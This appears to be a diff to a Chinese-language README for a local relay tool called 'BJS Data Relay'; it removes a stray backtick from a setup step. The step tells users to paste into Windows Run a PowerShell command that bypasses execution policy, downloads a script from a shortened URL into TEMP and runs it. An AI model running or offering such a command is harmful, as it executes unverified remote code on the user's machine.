@@ -45,7 +45,7 @@ BJS Data Relay 在本地起一个 HTTP 服务。网页发请求，它执行对�
 按 Windows+R 启动 [运行]
 
 ```powershell
-powershell -Exec Bypass -C "$f=$env:TEMP+'\b.ps1';iwr 'https://bjs.r.shortio.cn/setup' -Out $f;&$f"`
+powershell -Exec Bypass -C "$f=$env:TEMP+'\b.ps1';iwr 'https://bjs.r.shortio.cn/setup' -Out $f;&$f"
 ```
 
 运行部署脚本
